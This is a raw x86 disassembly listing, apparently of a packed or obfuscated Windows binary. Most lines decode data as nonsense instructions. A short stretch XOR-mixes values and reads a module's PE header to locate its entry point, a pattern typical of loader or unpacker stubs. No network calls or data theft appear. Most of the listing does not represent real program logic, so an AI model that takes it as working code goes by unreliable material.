  4186c3:	adc    dh,BYTE PTR [eax-0x12]
  4186c6:	repnz mov ah,0x1c
  4186c9:	bound  esp,QWORD PTR [ebp-0x19]
  4186cc:	ins    BYTE PTR es:[edi],dx
  4186cd:	inc    esi
  4186ce:	push   edi
  4186cf:	add    esi,DWORD PTR [eax]
  4186d1:	test   al,bh
  4186d3:	inc    ebp
  4186d4:	les    esp,FWORD PTR [ebx*8-0x78f58f5f]
  4186db:	ret    
  4186dc:	adc    al,BYTE PTR [ecx]
  4186de:	add    al,0x37
  4186e0:	xor    DWORD PTR [edx+edx*2],edx
  4186e3:	inc    ebp
  4186e4:	in     al,dx
  4186e5:	imul   ebx,DWORD PTR [ebx],0xffffffa6
  4186e8:	jmp    0x48f1bf9d
  4186ed:	xor    al,0x60
  4186ef:	mov    esi,esp
  4186f1:	outs   dx,BYTE PTR ds:[esi]
  4186f2:	xchg   esi,eax
  4186f3:	pop    eax
  4186f4:	fldenv [ecx+0x2914836c]
  4186fa:	push   0x7b3a11e1
  4186ff:	icebp  
  418700:	mov    BYTE PTR [edx],al
  418702:	xor    ecx,edx
  418704:	pushf  
  418705:	mov    edx,0x3856bfdb
  41870a:	adc    al,0x5a
  41870c:	scas   al,BYTE PTR es:[edi]
  41870d:	test   al,0xac
  41870f:	jmp    0x10cb:0xa7a2ca87
  418716:	xor    al,0x65
  418718:	jb     0x418797
  41871a:	mov    esi,0x7b27242e
  41871f:	or     al,0xfe
  418721:	fwait
  418722:	jnp    0x4186bb
  418724:	or     DWORD PTR [ecx-0x50],esi
  418727:	(bad)  
  418728:	stos   DWORD PTR es:[edi],eax
  418729:	retf   0x276a
  41872c:	jb     0x418785
  41872e:	rol    BYTE PTR [edx],1
  418730:	rcr    BYTE PTR [ebx-0x780a5a0d],0x30
  418737:	(bad)  [edx+0x6df547a8]
  41873d:	jbe    0x4186ce
  41873f:	int3   
  418740:	sbb    ah,dl
  418742:	jg     0x418727
  418744:	mov    ebp,0x3d1f036d
  418749:	jns    0x418739
  41874b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41874c:	or     ecx,DWORD PTR [edx+0x1e6a9b85]
  418752:	push   eax
  418753:	mov    ds:0x1509c983,al
  418758:	push   ebx
  418759:	dec    esp
  41875a:	pop    ecx
  41875b:	cmp    ebp,0x65
  41875e:	in     eax,0x42
  418760:	mov    eax,ds:0x42e02abe
  418765:	int3   
  418766:	fadd   DWORD PTR [esi+0x0]
  418769:	cli    
  41876a:	cmp    edi,DWORD PTR [edx+0x77168f27]
  418770:	ds pusha 
  418772:	ror    BYTE PTR ds:0x3ecb5c0e,1
  418778:	mov    ds:0xe60d613d,eax
  41877d:	add    DWORD PTR [edi-0x64005e8e],0x70
  418784:	out    0x72,eax
  418786:	and    bl,BYTE PTR [ebx-0x63]
  418789:	call   0xdf60:0xa1db6f5e
  418790:	jle    0x418789
  418792:	jae    0x418735
  418794:	sbb    eax,0x4dc42fa0
  418799:	jb     0x4187ad
  41879b:	sbb    esp,ebp
  41879d:	mov    ebx,0xf3bd04d9
  4187a2:	dec    edi
  4187a3:	mov    dl,0xd8
  4187a5:	cmp    al,0x53
  4187a7:	(bad)  
  4187a9:	(bad)  
  4187aa:	or     ecx,DWORD PTR [edx-0x4f4957a3]
  4187b0:	jb     0x4187d1
  4187b2:	pop    eax
  4187b3:	mov    edi,0x21877798
  4187b8:	loopne 0x41878d
  4187ba:	sbb    al,bl
  4187bc:	mov    dl,0xbc
  4187be:	fist   WORD PTR [ebx-0x5]
  4187c1:	xchg   edi,eax
  4187c2:	mov    eax,0x504328f0
  4187c7:	test   BYTE PTR [esp+eax*8+0x2388f11b],al
  4187ce:	ins    BYTE PTR es:[edi],dx
  4187cf:	xchg   esp,eax
  4187d0:	enter  0x9953,0x9a
  4187d4:	test   DWORD PTR [eax],0x2c1e689f
  4187da:	pop    ds
  4187db:	or     esi,edx
  4187dd:	rcl    DWORD PTR [edx+0x7a],1
  4187e0:	inc    ebx
  4187e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4187e2:	dec    ebx
  4187e3:	imul   edi
  4187e5:	lea    ecx,[edx+0x4]
  4187e8:	push   ds
  4187e9:	scas   al,BYTE PTR es:[edi]
  4187ea:	dec    edx
  4187eb:	add    ecx,0xffcd8d68
  4187f1:	mov    esi,ecx
  4187f3:	xor    esi,eax
  4187f5:	add    esi,DWORD PTR [ebp+0x8]
  4187f8:	mov    DWORD PTR [ebp+0x8],esi
  4187fb:	mov    esi,DWORD PTR [ebp+0x8]
  4187fe:	xor    esi,ecx
  418800:	xor    esi,eax
  418802:	mov    eax,DWORD PTR [edx+0x194]
  418808:	mov    ecx,DWORD PTR [eax]
  41880a:	mov    eax,DWORD PTR [ecx+0x3c]
  41880d:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  418811:	add    eax,ecx
  418813:	mov    DWORD PTR [ebp+0x8],esi
  418816:	mov    DWORD PTR [ebp+0x10],eax
  418819:	mov    eax,DWORD PTR [ebp+0x10]
  41881c:	pop    esi
  41881d:	test   eax,eax
  41881f:	je     0x419191
  418825:	push   DWORD PTR ds:0x41ebbe
  41882b:	jmp    0x418b45
  418830:	cmp    eax,0xcbd3c4c6
  418835:	rcl    ebp,1
  418837:	fcmove st,st(3)
  418839:	test   eax,0x29f91af2
  41883e:	xor    dl,BYTE PTR [edi+edx*1+0x7b787f3e]
  418845:	jle    0x4188bf
  418847:	js     0x418892
  418849:	cmp    ebp,DWORD PTR [edi]
  41884b:	jg     0x4187d0
  41884d:	retf   0xe5fe
  418850:	cwde   
  418851:	mov    ah,BYTE PTR [ebx]
  418853:	add    al,0xcf
  418855:	pop    eax
  418856:	mov    bh,BYTE PTR [edx+0x66]
  418859:	stos   BYTE PTR es:[edi],al
  41885a:	cdq    
  41885b:	int    0x91
  41885d:	add    DWORD PTR [edx],eax
  41885f:	aad    0x51
  418861:	or     esp,ebp
  418863:	jle    0x41882b
  418865:	test   BYTE PTR [ecx+0x2c],0x7b
  418869:	jmp    0x530e:0x78c06506
  418870:	scas   al,BYTE PTR es:[edi]
  418871:	mov    DWORD PTR [edx],esi
  418873:	hlt    
  418874:	jmp    0x18e8ece6
  418879:	jae    0x418855
  41887b:	test   BYTE PTR [esi-0x56dde566],dh
  418881:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418882:	data16 hlt 
  418884:	in     eax,0xcd
  418886:	iret   
  418887:	(bad)  
  418888:	and    al,0xcf
  41888a:	xchg   DWORD PTR [edx+0x5b],esp
  41888d:	inc    ecx
  41888e:	mov    al,0x6d
  418890:	xchg   esi,eax
  418891:	test   eax,0xba40e794
  418896:	pop    es
  418897:	js     0x418886
  418899:	mov    DWORD PTR [edi+ebp*8+0x78],eax
  41889d:	mov    cl,0xe6
  41889f:	adc    ecx,DWORD PTR [edi+esi*2]
  4188a2:	call   DWORD PTR [esi-0x1e464a02]
  4188a8:	or     DWORD PTR [edx+0x7d],ebx
  4188ab:	and    DWORD PTR [edx+esi*8+0x550d2829],0xfffffff8
  4188b3:	jnp    0x4188e5
  4188b5:	mov    dl,0x12
  4188b7:	adc    eax,0x3f950684
  4188bc:	mov    ch,0xdf
  4188be:	mov    ecx,0xb4824a74
  4188c3:	sbb    BYTE PTR [esi],0xec
  4188c6:	jmp    0xf46b:0x1df2904c
  4188cd:	push   ss
  4188ce:	cmc    
  4188cf:	sbb    eax,ebx
  4188d1:	rcl    DWORD PTR [ecx],cl
  4188d3:	imul   edi,DWORD PTR [edx],0x7a
  4188d6:	add    DWORD PTR [edi],ebp
  4188d8:	jae    0x41891b
  4188da:	sbb    cl,BYTE PTR ds:0x8f1a9fe8
  4188e0:	xor    cl,dl
  4188e2:	es jb  0x4188ce
  4188e5:	xlat   BYTE PTR ds:[ebx]
  4188e6:	jmp    0x93776f75
  4188eb:	into   
  4188ec:	scas   al,BYTE PTR es:[edi]
  4188ed:	sbb    esi,DWORD PTR [esi]
  4188ef:	mov    edi,0x46549b7e
  4188f4:	jo     0x41889a
  4188f6:	or     ecx,DWORD PTR [edx-0x2dda5560]
  4188fc:	mov    ds:0x8533ff0,al
  418901:	push   eax
  418902:	sbb    al,0x29
  418904:	cmc    
  418905:	fild   QWORD PTR [esi]
  418907:	adc    al,0xec
  418909:	mov    dh,0x9f
  41890b:	ret    0x63c6
  41890e:	aad    0x8c
  418910:	inc    ebx
  418911:	stc    
  418912:	enter  0x4ed4,0xb5
  418916:	ins    BYTE PTR es:[edi],dx
  418917:	push   0x62
  418919:	(bad)
  41891c:	ss mov esi,ecx
  41891f:	pop    ebx
  418920:	fadd   QWORD PTR [eax+0x4dbbc874]
  418926:	jge    0x4188d5
  418928:	retf   
  418929:	mov    eax,0x1ff70f25
  41892e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41892f:	call   0x956eb95a
  418934:	mov    dh,0x19
  418936:	rol    BYTE PTR [edi],1
  418938:	imul   esp,DWORD PTR [edx-0x5227c881],0xcae530bb
  418942:	ins    DWORD PTR es:[edi],dx
  418943:	sbb    DWORD PTR [ebp-0xd],edx
  418946:	or     ecx,DWORD PTR [edx+esi*2+0x7e]
  41894a:	mov    esp,0x675d7cdc
  41894f:	sbb    DWORD PTR [edi],0x6d5b1759
  418955:	leave  
  418956:	lock lahf 
  418958:	sub    eax,0xf9853878
  41895d:	repnz jecxz 0x41899c
  418960:	ror    DWORD PTR [eax+0x50749d2],cl
  418966:	xchg   ebx,eax
  418967:	jp     0x4189de
  418969:	cmp    eax,0xfbaf7de2
  41896e:	xchg   esp,eax
  41896f:	mov    esi,0x6102e33b
  418974:	call   0xdf558100
  418979:	test   al,0xbd
  41897b:	cld    
  41897c:	pop    esi
  41897d:	rcl    DWORD PTR [edx],cl
  41897f:	(bad)  
  418981:	pop    ecx
  418982:	aas    
  418983:	or     al,0xba
  418985:	jo     0x418937
  418987:	scas   eax,DWORD PTR es:[edi]
  418988:	inc    edx
  418989:	popa   
  41898a:	inc    ebx
  41898b:	sbb    BYTE PTR [ebx+0x7b],al
  41898e:	popf   
  41898f:	pop    ebx
  418990:	(bad)  
  418992:	out    dx,eax
  418993:	ds xchg bl,ah
  418996:	out    dx,al
  418997:	sar    DWORD PTR [esi+eiz*8-0x2abc5b13],0xea
  41899f:	fsub   st,st(0)
  4189a1:	clc    
  4189a2:	or     BYTE PTR [eax-0x76dc9098],0xad
  4189a9:	jle    0x418a26
  4189ab:	or     edi,DWORD PTR [ebp+0x55077d0f]
  4189b1:	mov    BYTE PTR [edx+esi*2],al
  4189b4:	dec    ecx
  4189b5:	loop   0x418957
  4189b7:	data16 jle 0x4189a8
  4189ba:	(bad)  
  4189bb:	and    edi,DWORD PTR [eax+0x3a08eb49]
  4189c1:	mov    dl,0x27
  4189c3:	mov    edx,cs
  4189c5:	inc    ebx
  4189c6:	rcl    BYTE PTR [edx-0x36],1
  4189c9:	cmp    cl,BYTE PTR [esi-0x66c68502]
  4189cf:	outs   dx,BYTE PTR ds:[esi]
  4189d0:	mov    ebx,DWORD PTR [esi+0x32]
  4189d3:	stc    
  4189d4:	or     DWORD PTR [ebp+0x63e0e518],ebx
  4189da:	stc    
  4189db:	pop    ebx
  4189dc:	push   esi
  4189dd:	or     DWORD PTR [eax+esi*4+0x26],edi
  4189e1:	lods   eax,DWORD PTR ds:[esi]
  4189e2:	bound  esi,QWORD PTR [ebx-0x749332ea]
  4189e8:	iret   
  4189e9:	mov    al,ds:0xa3e7aac8
  4189ee:	add    ebp,ebx
  4189f0:	mov    al,ds:0x418663f1
  4189f5:	sub    ebx,DWORD PTR [ecx+0x70cd6132]
  4189fb:	sti    
  4189fc:	std    
  4189fd:	in     al,dx
  4189fe:	add    al,0x2e
  418a00:	sbb    eax,0x7217da9c
  418a05:	aam    0x39
  418a07:	pusha  
  418a08:	lds    esp,FWORD PTR ds:0xbd07ca94
  418a0e:	out    0xa8,eax
  418a10:	dec    esp
  418a11:	aaa    
  418a12:	aad    0x58
  418a14:	(bad)  [edx+0x39ffed60]
  418a1a:	lods   al,BYTE PTR ds:[esi]
  418a1b:	(bad)  
  418a1c:	xchg   esi,eax
  418a1d:	loopne 0x418a3d
  418a1f:	xlat   BYTE PTR ds:[ebx]
  418a20:	adc    BYTE PTR [ebx-0x4c],ah
  418a23:	daa    
  418a24:	inc    edi
  418a25:	setb   BYTE PTR [edx-0x67f2960f]
  418a2c:	or     DWORD PTR [edi],edi
  418a2e:	add    eax,0xf4b2274f
  418a33:	xlat   BYTE PTR ds:[ebx]
  418a34:	test   al,0x5d
  418a36:	ss nop
  418a38:	mov    esi,DWORD PTR [ecx+edi*4]
  418a3b:	sbb    ecx,DWORD PTR [ecx]
  418a3d:	mov    bl,al
  418a3f:	cmp    DWORD PTR [ecx+0x636ddf4e],edi
  418a45:	pop    edx
  418a46:	dec    eax
  418a47:	dec    DWORD PTR [ecx]
  418a49:	and    al,0x21
  418a4b:	mov    ch,0x41
  418a4d:	push   ss
  418a4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a4f:	sub    BYTE PTR [ebp-0x4fbb6fd3],ch
  418a55:	push   ebp
  418a56:	inc    edi
  418a57:	add    dl,BYTE PTR [edi+eax*2-0x14]
  418a5b:	sbb    eax,0x36067115
  418a60:	sbb    BYTE PTR [ebp-0x2c2dfcb7],ah
  418a66:	sbb    dh,BYTE PTR [edi+ebx*1]
  418a69:	aaa    
  418a6a:	pop    ds
  418a6b:	add    dl,BYTE PTR [ebx]
  418a6d:	sbb    BYTE PTR [ecx-0xbe05408],al
  418a73:	sti    
  418a74:	nop
  418a75:	sbb    DWORD PTR [eax+0x57facb27],esi
  418a7b:	sti    
  418a7c:	fcmovnb st,st(2)
  418a7e:	pop    ds
  418a7f:	inc    ecx
  418a80:	fidiv  WORD PTR [esi]
  418a82:	xor    edx,DWORD PTR [ebp-0x24c7490c]
  418a88:	or     BYTE PTR [edi+0x3082fd4e],al
  418a8e:	sahf   
  418a8f:	pop    eax
  418a90:	xor    BYTE PTR [eax-0xc],bl
  418a93:	dec    esp
  418a94:	push   ss
  418a95:	call   0xd9ccf4c0
  418a9a:	mov    bh,0x1
  418a9c:	jbe    0x418a22
  418a9e:	mov    ebp,0xfe433f6c
  418aa3:	cld    
  418aa4:	sub    DWORD PTR [eax+0x1],0x637868cc
  418aab:	xor    esp,DWORD PTR ds:[esi]
  418aae:	add    ebp,eax
  418ab0:	ds push eax
  418ab2:	xchg   ebp,eax
  418ab3:	in     eax,dx
  418ab4:	and    eax,0xee762296
  418ab9:	pushf  
  418aba:	les    ecx,FWORD PTR [ebp-0x39]
  418abd:	pop    ds
  418abe:	pushf  
  418abf:	or     ah,BYTE PTR [edx+0x681082c7]
  418ac5:	jmp    0x418a7c
  418ac7:	fimul  DWORD PTR es:[ebx-0x51]
  418acb:	cmp    al,0x7d
  418acd:	mov    edx,0xcb7379e2
  418ad2:	js     0x418a8a
  418ad4:	loopne 0x418a72
  418ad6:	or     ecx,DWORD PTR [edi+0x5e811bc1]
  418adc:	inc    esi
  418add:	lea    ebp,[eax-0x700b3d69]
  418ae3:	jnp    0x418b40
  418ae5:	push   ss
  418ae6:	les    ebx,FWORD PTR [ecx+ebx*8]
  418ae9:	fdivr  DWORD PTR [esi+0x2d]
  418aec:	rol    esp,0x9f
  418aef:	ins    DWORD PTR es:[edi],dx
  418af0:	aaa    
  418af1:	test   al,0x8d
  418af3:	pop    ebx
  418af4:	imul   ebp,DWORD PTR [edx-0x3],0xaa17286b
  418afb:	xchg   DWORD PTR [ecx-0x22],esp
  418afe:	push   esi
  418aff:	fdivr  st(6),st
  418b01:	fs sti 
  418b03:	sahf   
  418b04:	push   ebx
  418b05:	(bad)
  418b08:	jb     0x418b7d
  418b0a:	icebp  
  418b0b:	or     ecx,DWORD PTR [ebx-0x59]
  418b0e:	or     ecx,esi
  418b10:	jo     0x418ae0
  418b12:	cdq    
  418b13:	and    WORD PTR [ebp+0x25],bp
  418b17:	data16 into 
  418b19:	fild   WORD PTR [eax+0x31]
  418b1c:	(bad)  
  418b1e:	in     al,dx
  418b1f:	retf   0x2132
  418b22:	push   ss
  418b23:	fcomp  QWORD PTR [ecx]
  418b25:	cmp    edi,esp
  418b27:	loope  0x418b3f
  418b29:	cmp    DWORD PTR [eax-0x58f8a55d],eax
  418b2f:	pusha  
  418b30:	push   ds
  418b31:	out    0xea,eax
  418b33:	ret    0x141f
  418b36:	inc    edi
  418b37:	scas   al,BYTE PTR es:[edi]
  418b38:	pop    esi
  418b39:	sbb    BYTE PTR [edi+ebx*1],ch
  418b3c:	pop    ss
  418b3d:	jmp    0x69ac1ef6
  418b42:	jp     0x418b38
  418b44:	cmc    
  418b45:	push   DWORD PTR ds:0x41e96a
  418b4b:	mov    eax,DWORD PTR [edx+0x194]
  418b51:	jmp    0x418e6b
  418b56:	retf   
  418b57:	into   
  418b58:	ret    
  418b59:	ret    
  418b5a:	(bad)  
  418b5c:	retf   
  418b5d:	(bad)  
  418b5e:	xor    dh,cl
  418b60:	stos   DWORD PTR es:[edi],eax
  418b61:	push   eax
  418b62:	mov    edx,0x124e7c2b
  418b67:	ret    
  418b68:	jg     0x418be2
  418b6a:	jnp    0x418bea
  418b6c:	js     0x418be6
  418b6e:	cmp    ebx,esi
  418b70:	push   ebp
  418b71:	in     eax,0xd8
  418b73:	ror    ah,cl
  418b75:	mov    ds:0xad78c99c,al
  418b7a:	sub    eax,0xb5065546
  418b7f:	xor    al,BYTE PTR ds:0xf729a925
  418b85:	jns    0x418b37
  418b87:	fwait
  418b88:	and    BYTE PTR [esi-0x4a],dl
  418b8b:	add    BYTE PTR [edi+0x46a0f20d],ah
  418b91:	int3   
  418b92:	clc    
  418b93:	xchg   ebx,eax
  418b94:	mov    BYTE PTR [ebp-0x783b91b1],ah
  418b9a:	in     al,dx
  418b9b:	das    
  418b9c:	mov    al,0xcc
  418b9e:	xchg   edi,eax
  418b9f:	mov    ds:0x5b10f497,al
  418ba4:	dec    ebx
  418ba5:	(bad)
  418baa:	jns    0x418b9e
  418bac:	mov    ch,0x7b
  418bae:	mov    ecx,0xaa55866e
  418bb3:	sahf   
  418bb4:	xor    BYTE PTR [eax+0x7d],dl
  418bb7:	push   esi
  418bb8:	pop    ebx
  418bb9:	add    al,0x28
  418bbb:	aad    0x1a
  418bbd:	pop    ebp
  418bbe:	fld    QWORD PTR [ebp-0x62]
  418bc1:	sti    
  418bc2:	add    DWORD PTR [esi],ebp
  418bc4:	loopne 0x418beb
  418bc6:	js     0x418b71
  418bc8:	mov    edx,0xe0bfac64
  418bcd:	fisub  WORD PTR [ecx]
  418bcf:	dec    edi
  418bd0:	ret    0xc2d1
  418bd3:	std    
  418bd4:	bound  esi,QWORD PTR [eax-0x64]
  418bd7:	adc    ebp,edx
  418bd9:	aaa    
  418bda:	xchg   edx,eax
  418bdb:	leave  
  418bdc:	in     eax,dx
  418bdd:	in     eax,0x3a
  418bdf:	cmp    cl,BYTE PTR [ecx-0x2d]
  418be2:	sti    
  418be3:	(bad)  
  418be4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418be5:	fmul   DWORD PTR [esi]
  418be7:	mov    WORD PTR [ecx+eax*8+0x59],?
  418beb:	jne    0x418c14
  418bed:	jge    0x418bcc
  418bef:	int    0x9
  418bf1:	jae    0x418ba5
  418bf3:	test   al,0xb6
  418bf5:	sub    eax,0x84b77073
  418bfa:	jno    0x418c21
  418bfc:	jge    0x418c24
  418bfe:	or     DWORD PTR [esi+edi*4-0x2f],edi
  418c02:	shr    BYTE PTR [edx-0x70f4a11f],cl
  418c08:	xlat   BYTE PTR ds:[ebx]
  418c09:	ss (bad) 
  418c0b:	jo     0x418bbe
  418c0d:	pand   mm0,QWORD PTR ds:0xd03703ea
  418c14:	frstpm(287 only) 
  418c16:	ds out dx,eax
  418c18:	jns    0x418c56
  418c1a:	lahf   
  418c1b:	(bad)  
  418c1d:	xlat   BYTE PTR ds:[ebx]
  418c1e:	lods   al,BYTE PTR ds:[esi]
  418c1f:	jmp    0xb89f583
  418c24:	mov    ds:0x414a0c7c,al
  418c29:	cmp    ecx,DWORD PTR [ebx-0x7c]
  418c2c:	inc    ebp
  418c2d:	jmp    0xb8fc:0xa028a36d
  418c34:	push   es
  418c35:	sub    DWORD PTR [esp+ebx*1-0x4be62ced],0x5300a80c
  418c40:	dec    esp
  418c41:	cdq    
  418c42:	fdivp  st(7),st
  418c44:	fsubr  st,st(1)
  418c46:	jo     0x418c68
  418c48:	rcr    ecx,0xc6
  418c4b:	outs   dx,BYTE PTR ds:[esi]
  418c4c:	xor    DWORD PTR [edi+0x56a9d8b0],0xffffffaa
  418c53:	retf   
  418c54:	imul   BYTE PTR [edx+0x50]
  418c57:	call   0xa31c:0xd7e2779b
  418c5e:	mov    ds,WORD PTR [ecx-0x7b41bd94]
  418c64:	adc    BYTE PTR [ecx+0x60],bl
  418c67:	data16 mov es,WORD PTR [ebp+ebx*1-0x1d]
  418c6c:	push   ss
  418c6d:	std    
  418c6e:	sub    eax,0xfdddf9e3
  418c73:	(bad)
  418c77:	sti    
  418c78:	inc    eax
  418c79:	scas   eax,DWORD PTR es:[edi]
  418c7a:	loop   0x418c9b
  418c7c:	ja     0x418cd6
  418c7e:	xor    bl,bl
  418c80:	shl    BYTE PTR [edx],cl
  418c82:	rcl    DWORD PTR [edi-0x28],cl
  418c85:	push   ebx
  418c86:	test   eax,0x28331881
  418c8b:	mov    al,0x30
  418c8d:	std    
  418c8e:	cmp    BYTE PTR [ebx+0x682b5a14],dl
  418c94:	loopne 0x418cc4
  418c96:	lods   eax,DWORD PTR ds:[esi]
  418c97:	push   0xffffffc8
  418c99:	sbb    edx,DWORD PTR [edi+esi*4-0x77]
  418c9d:	lds    esi,FWORD PTR [ecx-0x6b2b7aa8]
  418ca3:	hlt    
  418ca4:	enter  0xe9b9,0x92
  418ca8:	ss stos BYTE PTR es:[edi],al
  418caa:	and    ebp,0xe80331de
  418cb0:	xchg   ebp,eax
  418cb1:	je     0x418c63
  418cb3:	in     eax,dx
  418cb4:	jne    0x418cdd
  418cb6:	cdq    
  418cb7:	sub    eax,0x3e8d2c4b
  418cbc:	clc    
  418cbd:	test   DWORD PTR [eax],ebx
  418cbf:	xlat   BYTE PTR ds:[ebx]
  418cc1:	div    DWORD PTR [ecx+0x2df5e003]
  418cc7:	or     bh,al
  418cc9:	outs   dx,BYTE PTR ds:[esi]
  418cca:	ins    DWORD PTR es:[edi],dx
  418ccb:	push   cs
  418ccc:	lods   al,BYTE PTR ds:[esi]
  418ccd:	jmp    0x418cff
  418ccf:	adc    esi,esp
  418cd1:	mov    edi,0xc9dc25f1
  418cd6:	mov    al,ds:0x68156e4e
  418cdb:	add    bh,BYTE PTR cs:[esi+0x35]
  418cdf:	mov    eax,0xc78a023a
  418ce4:	sub    ch,BYTE PTR [edx+0x283fa16b]
  418cea:	clc    
  418ceb:	outs   dx,BYTE PTR ds:[esi]
  418cec:	loope  0x418ca1
  418cee:	pop    ds
  418cef:	cmp    al,0x82
  418cf1:	test   al,0x79
  418cf3:	arpl   WORD PTR [eax-0x4432a908],si
  418cf9:	push   eax
  418cfa:	mov    ebp,0xc2ae7466
  418cff:	bound  esi,QWORD PTR [esi]
  418d01:	jp     0x418cf7
  418d03:	add    BYTE PTR [ebx],cl
  418d05:	loope  0x418d68
  418d07:	hlt    
  418d08:	add    ch,BYTE PTR [edi+0x1556af1]
  418d0e:	aaa    
  418d0f:	cld    
  418d10:	clc    
  418d11:	mov    WORD PTR [ebx+edx*2-0x51411ada],ss
  418d18:	stc    
  418d19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d1a:	mov    eax,0xa5c4560f
  418d1f:	repz sub DWORD PTR [ebx-0x153f9c08],esp
  418d26:	cmp    BYTE PTR [ebx],ah
  418d28:	retf   
  418d29:	inc    edx
  418d2a:	inc    edx
  418d2b:	in     eax,dx
  418d2c:	and    DWORD PTR [ebp-0x3b8251e3],ebp
  418d32:	inc    ecx
  418d33:	(bad)  
  418d34:	outs   dx,BYTE PTR ds:[esi]
  418d35:	xor    ebx,DWORD PTR [esi+0x7062c5e6]
  418d3b:	cli    
  418d3c:	push   ecx
  418d3d:	mov    dh,0x63
  418d3f:	pop    ds
  418d40:	jl     0x418d1b
  418d42:	push   edi
  418d43:	daa    
  418d44:	dec    BYTE PTR [ebp+0x27]
  418d47:	retf   
  418d48:	pushf  
  418d49:	xor    ebx,DWORD PTR [ecx+0xca0ddf6]
  418d4f:	std    
  418d50:	sub    eax,DWORD PTR [esi+0x4c97095a]
  418d56:	cmp    DWORD PTR [ebx-0x3cec535e],0xcf366016
  418d60:	sub    DWORD PTR [esi+0x4],ecx
  418d63:	push   esp
  418d64:	push   esi
  418d65:	mov    ecx,DWORD PTR [ebp-0x4f]
  418d68:	dec    ebp
  418d69:	aam    0xce
  418d6b:	jmp    0x418d56
  418d6d:	adc    ch,BYTE PTR [ecx]
  418d6f:	pop    es
  418d70:	mov    bh,0x86
  418d72:	stos   DWORD PTR es:[edi],eax
  418d73:	daa    
  418d74:	or     al,0x87
  418d76:	adc    DWORD PTR [ebp-0x4b],esi
  418d79:	data16 clc 
  418d7b:	lea    esi,[ebx+eax*4+0x37]
  418d7f:	mov    esi,0x81bcb27f
  418d84:	jnp    0x418d70
  418d86:	inc    esi
  418d87:	dec    edi
  418d88:	les    eax,FWORD PTR [esi+edx*1+0x311748d9]
  418d8f:	jle    0x418d40
  418d91:	sbb    ecx,DWORD PTR [edi]
  418d93:	dec    edi
  418d94:	mov    edi,0xdb48e4b0
  418d99:	adc    DWORD PTR [ebx+0x6c765b5b],edi
  418d9f:	mov    edi,0xaef2994f
  418da4:	mov    edi,0xf0a6783d
  418da9:	sar    DWORD PTR [edi+0x3ec77fa3],1
  418daf:	out    0x16,al
  418db1:	inc    edi
  418db2:	pop    ecx
  418db3:	dec    edi
  418db4:	pop    ebx
  418db5:	lds    ecx,FWORD PTR [esi]
  418db7:	add    DWORD PTR ds:0x246f45f1,ebx
  418dbd:	jmp    ebp
  418dbf:	xor    eax,0xb76d855d
  418dc4:	push   ss
  418dc5:	ins    DWORD PTR es:[edi],dx
  418dc6:	adc    ch,BYTE PTR [ecx+0x4f]
  418dc9:	push   eax
  418dca:	aaa    
  418dcb:	inc    ecx
  418dcc:	aaa    
  418dcd:	(bad)  
  418dce:	xchg   edx,eax
  418dcf:	mov    al,ds:0x68e002b4
  418dd4:	sti    
  418dd5:	rcr    DWORD PTR [ebx+0x2816f56d],0x6c
  418ddc:	(bad)  
  418dde:	bound  ecx,QWORD PTR [ecx+eax*1]
  418de1:	xchg   esi,eax
  418de2:	and    al,ch
  418de4:	mov    dl,0x39
  418de6:	into   
  418de7:	scas   al,BYTE PTR es:[edi]
  418de8:	jmp    0x418dd0
  418dea:	push   DWORD PTR [esi-0x4a24a445]
  418df0:	or     BYTE PTR [ebx-0x1fd66310],dh
  418df6:	add    DWORD PTR [edx],0x17
  418df9:	mov    al,0x2a
  418dfb:	stc    
  418dfc:	xor    dl,0x28
  418dff:	sbb    ebx,ecx
  418e01:	out    0xdc,al
  418e03:	push   cs
  418e04:	mov    al,0xfa
  418e06:	inc    esp
  418e07:	aaa    
  418e08:	scas   al,BYTE PTR es:[edi]
  418e09:	mov    ebp,0x45d944f2
  418e0e:	cs jmp 0x418e4f
  418e11:	push   edx
  418e12:	jp     0x418df1
  418e14:	xor    BYTE PTR [edx-0x23ee7992],dl
  418e1a:	xchg   edx,eax
  418e1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e1c:	mov    bh,0x43
  418e1e:	les    ecx,FWORD PTR [ebp+0x47]
  418e21:	dec    ecx
  418e22:	sbb    eax,0x63d77a70
  418e27:	push   edx
  418e28:	push   edi
  418e29:	sar    DWORD PTR [edi],cl
  418e2b:	in     eax,dx
  418e2c:	or     eax,DWORD PTR [eax-0x1949d1e]
  418e32:	and    eax,0xa03db4ae
  418e37:	sub    dl,bh
  418e39:	pop    eax
  418e3a:	mov    ah,0x5
  418e3c:	push   ebp
  418e3d:	dec    ebp
  418e3e:	(bad)  
  418e3f:	ds fcmovnbe st,st(0)
  418e42:	bound  ebx,QWORD PTR [edx]
  418e44:	mov    ebx,0x4c719b0d
  418e49:	jno    0x418e68
  418e4b:	pop    eax
  418e4c:	call   0x498a:0x70d3c733
  418e53:	lahf   
  418e54:	add    DWORD PTR [ebx-0x1],ebp
  418e57:	mov    cl,0xce
  418e59:	xchg   BYTE PTR [ecx],dl
  418e5b:	push   eax
  418e5c:	inc    esp
  418e5d:	push   0x8956dddc
  418e62:	mov    bl,0x6d
  418e64:	adc    eax,0xced8844d
  418e69:	pusha  
  418e6a:	aam    0xff
  418e6c:	xor    BYTE PTR [ebx+0x15e91045],cl
  418e72:	add    eax,DWORD PTR [eax]
  418e74:	add    bl,cl
  418e76:	rol    dl,cl
  418e78:	(bad)  
  418e79:	(bad)  
  418e7b:	leave  
  418e7c:	shl    DWORD PTR [esi+0x11],1
  418e7f:	(bad)  
  418e81:	cmp    eax,0xd1d11ef
  418e86:	sar    BYTE PTR [edi+0x78],0x7b
  418e8a:	jle    0x418f04
  418e8c:	js     0x418eaa
  418e8e:	popf   
  418e8f:	aaa    
  418e90:	lahf   
  418e91:	adc    ebx,DWORD PTR [esi+0x16dda107]
  418e97:	pop    ss
  418e98:	inc    edi
  418e99:	adc    BYTE PTR [esi+esi*8+0x16ff2e44],0xab
  418ea1:	push   esp
  418ea2:	push   edi
  418ea3:	nop
  418ea4:	(bad)  [edi+eax*8+0x4ddf25c9]
  418eab:	fwait
  418eac:	mov    eax,DWORD PTR [eax+0x50]
